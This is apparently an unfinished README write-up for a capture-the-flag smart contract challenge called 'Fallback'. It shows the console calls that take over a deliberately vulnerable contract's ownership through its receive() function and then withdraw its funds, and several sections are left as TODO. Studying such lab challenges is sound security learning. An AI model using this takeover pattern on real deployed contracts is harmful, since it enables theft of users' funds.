# Fallback challenge - Level 1 🚧 Update In Progress 🏗
<p align="left"> <img src="https://komarev.com/ghpvc/?username=Level1&label=Repository%20views&color=0e75b6&style=flat" alt="wrappedusername" /> </p>

```yml
This smart contract has a vulnerability, because:
```

- TODO

```JavaScript
await contract.contribute({value: 1});
await contract.sendTransaction({value: 1 });
await contract.owner();
await contract.withdraw();
```

```Solidity
/** 
* @notice This fallback function receive() is the main attack target, in order to pass the 
* require statement player must use function contribute() 1 wei will be enough, using the console
* player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
* player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens. 
*/
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender; 
}
```

## The victim contract in detail

```yml
The victim contract imports OpenZeppelin's safeMath here:
```
- TODO

```Solidity

```
  
